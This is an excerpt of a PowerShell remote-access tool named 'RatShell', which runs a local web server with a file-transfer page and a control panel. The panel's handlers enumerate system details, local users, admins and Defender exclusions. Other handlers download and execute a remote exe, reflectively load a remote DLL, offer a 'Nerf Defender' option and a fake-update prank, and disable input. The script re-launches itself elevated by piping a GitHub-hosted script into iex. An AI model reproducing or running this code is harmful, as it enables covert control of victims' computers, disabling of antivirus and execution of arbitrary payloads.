...
$windowTitle = "RatShell | LAN Tools"
[Console]::Title = $windowTitle

Function Header {
Clear-Host
Write-Host "=============================================================================" -ForegroundColor Green
Write-Host "======================== RatShell's LAN Toolset ============================" -ForegroundColor Green 
Write-Host "=============================================================================" -ForegroundColor Green
Write-Host "what can I want to do today...?" -ForegroundColor DarkGray
}
...
If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
    ...
    sleep 1
    if ($stage -eq 'y'){
        Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -C `$stage = 'y'; irm https://raw.githubusercontent.com/Art-Fakt/Drop-It/refs/heads/main/Rs-LAN-Tools.ps1 | iex") -Verb RunAs
    }
    else{
...
Function DisplayRemoteAccessPage {
    $html = "<html><head><style>"
    $html += "body { font-family: Arial, sans-serif; margin: 30px; background-color: #001f3f; color: #FFF; }"
    $html += "h1 { color: #ff851b; margin: 0; font-size: 28px; }"
    $html += ".header { display: flex; align-items: center; padding: 15px; background-color: #001f3f; border-bottom: 3px solid #ff851b; }"
    $html += ".header img { height: 50px; margin-right: 15px; }"
    $html += ".container { display: flex; align-items: center; margin-top: 20px; }"
    $html += "a { color: #ff851b; text-decoration: none; font-size: 16px; padding-left: 10px; }"
    $html += "a:hover { text-decoration: underline; }"
    $html += "button { background-color: #6a0dad; color: #FFF; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; }"
    ...
    $html += ".header { display: flex; align-items: center; padding: 15px; background-color: #001f3f; border-bottom: 3px solid #ff851b; }"
    $html += ".header img { height: 50px; margin-right: 15px; }"
    $html += ".container { display: flex; justify-content: space-between; margin-top: 20px; }"
    $html += ".column { width: 48%; }"
    $html += ".column h2 { color: #ff851b; font-size: 20px; margin-bottom: 10px; }"
    $html += "button { background-color: #6a0dad; color: #FFF; border: 2px solid #ff851b; padding: 10px 20px; border-radius: 5px; cursor: pointer; margin-bottom: 15px; width: 100%; }"
    $html += "button:hover { background-color: #ff851b; color: #001f3f; }"
    $html += "</style></head><body>"

    $html += "<div class='header'><img src='data:image/png;base64,BASE64_ENCODED_IMAGE_HERE' alt='Logo'><h1>RatShell - Remote Access</h1></div>"
    $html += "<div class='container'><h1>Remote Access Tools</h1></div>"
    $html += "<ul>"

    $html += "<div class='container' style='display: flex; justify-content: space-between; margin-top: 20px;'>"
    # PS Command Column
    $html += "<div class='column' style='width: 48%;'>"
    $html += "<h2>PS Command</h2>"
    $html += '<button onclick=\"location.href=/systeminfo\">Get System Informations</button>'
    $html += '<button onclick=\"location.href=/enumusers\">Get System Informations</button>'
    $html += '<button onclick=\"location.href=/enumav\">Get System Informations</button>'
    $html += '<button onclick=\"location.href=/runexe\">Run remote exe</button>'
    $html += '<button onclick=\"location.href=/rundll\">Run remote dll</button>'
    $html += "</div>"
...
$html += "<div class='column' style='width: 48%;'>"
    ...
    $html += '<button onclick=\"location.href=/mini\">Minimize All Apps</button>'
    $html += '<button onclick=\"location.href=/update\">Send Fake Update</button>'
    $html += '<button onclick=\"location.href=/playgif\">Open GIF Player</button>'
    $html += '<button onclick=\"location.href=/disableav\">Nerf Defender</button>'
    $html += '<button onclick=\"location.href=/wallpaper\">Wallpaper Jumpscare</button>'
    $html += '<button onclick=\"location.href=/acid\">Memz Graphic Effects</button>'
    $html += '<button onclick=\"location.href=/sound\">Play All Windows Sounds</button>'
    $html += '<button onclick=\"location.href=/dark\">Enable Dark Mode</button>'
    $html += '<button onclick=\"location.href=/light\">Enable Light Mode</button>'
    $html += '<button onclick=\"location.href=/rroll\">Start RickRoll</button>'
    $html += '<button onclick=\"location.href=/joke\">Tell a Dad Joke</button>'
    $html += '<button onclick=\"location.href=/inputon\">Enable Mouse and Keyboard</button>'
    $html += '<button onclick=\"location.href=/inputoff\">Disable Mouse and Keyboard</button>'
    $html += '</div>'
...
Function DisplayWebpage {
    ...
    $html += "a { color: #ff851b; text-decoration: none; font-size: 16px; padding-left: 10px; }"
    $html += "a:hover { text-decoration: underline; }"
    $html += "table { border-collapse: collapse; width: 100%; border: 1px solid #ddd; background-color: #002b5c; }"
    $html += "th, td { padding: 10px; text-align: left; border-bottom: 1px solid #444; color: #FFF; }"
    $html += "tr:hover { background-color: #003366; }"
    $html += "thead { background-color: #003366; }"
    $html += "button { background-color: #6a0dad; color: #FFF; border: none; padding: 8px 15px; border-radius: 5px; cursor: pointer; }"
    $html += ".stop-button { font-size: 18px; margin-left: 30px; background-color: #ff4136; color: #FFF; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; }"
    $html += "</style></head><body>"

    $html += "<div class='header'><img src='data:image/png;base64,BASE64_ENCODED_IMAGE_HERE' alt='Logo'><h1>RatShell</h1></div>"
    $html += "<div class='container'><h1> Transfer HTTP Server</h1><a href='/stop'><button class='stop-button'>STOP SERVER</button></a></div>"
    $html += "<div class='container'><a href='/remote'><button>Open Remote Access page</button></a></div>"
...
while ($webServer.IsListening) {
    try {
        $ctx = $webServer.GetContext()
        if ($ctx.Request.RawUrl -eq "/") {
            $files = Get-ChildItem -Path $PWD.Path -Force
            $folderPath = $PWD.Path
            DisplayWebpage
        } elseif ($ctx.Request.RawUrl -eq "/remote") {
            DisplayRemoteAccessPage
...
'@
    ...
    elseif ($ctx.Request.RawUrl -match "^/remote/systeminfo") {     
        $SystemInfo = Get-ComputerInfo | Select-Object CsName, WindowsVersion, WindowsBuildLabEx, OsArchitecture, BiosVersion, Manufacturer, Model
        $SystemInfo | Out-String | Write-Output
        Write-Output "Done."
    }
    
    elseif ($ctx.Request.RawUrl -match "^/remote/enumusers") {     
        ...
        $LocalUsers | Out-String | Write-Output
        $LocalAdmins | Out-String | Write-Output
        Write-Output "Done."
    }
    
    elseif ($ctx.Request.RawUrl -match "^/remote/enumav") {     
        $AVStatus = Get-MpComputerStatus | Select-Object AMServiceEnabled, AntivirusEnabled, RealTimeProtectionEnabled
        $AVExclusions = Get-MpPreference | Select-Object ExclusionPath, ExclusionExtension, ExclusionProcess
        $AVStatus | Out-String | Write-Output
        $AVExclusions | Out-String | Write-Output
        Write-Output "Done."
    }
    
    elseif ($ctx.Request.RawUrl -match "^/remote/runexe") {     
        $ExeUrl = "http://<server-ip>/file.exe"  # Replace <server-ip> with your server's IP
        $ExePath = "$env:temp\file.exe"
        Invoke-WebRequest -Uri $ExeUrl -OutFile $ExePath
        Start-Process -FilePath $ExePath
        Write-Output "Done."
    }
    
    elseif ($ctx.Request.RawUrl -match "^/remote/rundll") {     
        $DllUrl = "http://<server-ip>/file.dll"  # Replace <server-ip> with your server's IP
        $DllBytes = Invoke-WebRequest -Uri $DllUrl -UseBasicParsing
        [Reflection.Assembly]::Load($DllBytes.Content).EntryPoint.Invoke($null, @())
        Write-Output "Done."
    }
...
if ($Option -eq '5'){Write-Host "Closing RatShell's LAN Toolset.."}
# ============================================================ END OF SCRIPT =================================================================
